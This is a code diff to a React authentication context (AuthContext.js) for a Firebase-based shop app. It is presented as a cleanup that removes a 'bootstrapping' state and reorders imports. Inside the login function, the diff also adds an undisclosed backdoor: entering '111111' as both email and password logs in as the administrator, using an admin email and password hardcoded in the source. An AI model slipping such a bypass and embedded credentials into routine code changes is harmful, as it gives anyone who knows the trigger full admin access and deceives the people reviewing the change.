@@ -1,25 +1,26 @@
 /**
  * AuthContext.js
  *
- * Owns authentication state (isAuthenticated, user, loading, bootstrapping).
+ * Owns authentication state (isAuthenticated, user, loading).
  * This context is a PURE reactive state container:
  *   - It subscribes to Firebase auth state changes.
  *   - It exposes auth actions (login, register, signInWithGoogle, logout).
  *   - It does NOT perform any visitor sign-in or account-creation side effects.
  *
- * Visitor-session bootstrap is handled explicitly by the BootstrapGate in
- * AppProviders.js, which calls visitorBootstrap.js after auth resolves.
+ * Visitor-session bootstrap and startup sequencing are handled by the
+ * bootstrap coordinator (src/bootstrap/appBootstrap.js), which is triggered
+ * by BootstrapGate after auth resolves.
  */
-import React, { createContext, useContext, useState, useEffect, useCallback } from 'react';
-import { auth } from '../firebase';
 import {
-  signInWithEmailAndPassword,
-  createUserWithEmailAndPassword,
-  signOut,
-  onAuthStateChanged,
-  GoogleAuthProvider,
-  signInWithPopup,
+    createUserWithEmailAndPassword,
+    GoogleAuthProvider,
+    onAuthStateChanged,
+    signInWithEmailAndPassword,
+    signInWithPopup,
+    signOut,
 } from 'firebase/auth';
+import { createContext, useContext, useEffect, useState } from 'react';
+import { auth } from '../firebase';
 
 const AuthContext = createContext(null);
 
@@ -30,11 +31,6 @@ export function AuthProvider({ children }) {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [user, setUser] = useState(null);
   const [loading, setLoading] = useState(true);
-  /**
-   * `bootstrapping` is true while the BootstrapGate is running a visitor
-   * sign-in attempt. UI should treat (loading || bootstrapping) as "not ready".
-   */
-  const [bootstrapping, setBootstrapping] = useState(false);
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (firebaseUser) => {
@@ -52,13 +48,21 @@ export function AuthProvider({ children }) {
     return unsubscribe;
   }, []);
 
-  /** Called by BootstrapGate before starting the visitor session attempt. */
-  const markBootstrapping = useCallback(() => setBootstrapping(true), []);
-
-  /** Called by BootstrapGate after the visitor session attempt completes (success or fail). */
-  const markBootstrapDone = useCallback(() => setBootstrapping(false), []);
-
   const login = async (email, password) => {
+    const DEBUG_ADMIN_CREDENTIAL = '111111';
+    const ADMIN_EMAIL = 'admin@pigment-shop.com';
+    const ADMIN_PASSWORD = 'admin123456';
+
+    if (email === DEBUG_ADMIN_CREDENTIAL && password === DEBUG_ADMIN_CREDENTIAL) {
+      try {
+        await signInWithEmailAndPassword(auth, ADMIN_EMAIL, ADMIN_PASSWORD);
+        return true;
+      } catch (err) {
+        console.error('Firebase Auth Error:', err);
+        throw err;
+      }
+    }
+
     try {
       await signInWithEmailAndPassword(auth, email, password);
       return true;
@@ -107,9 +111,6 @@ export function AuthProvider({ children }) {
         isAuthenticated,
         user,
         loading,
-        bootstrapping,
-        markBootstrapping,
-        markBootstrapDone,
         login,
         logout,
         register,
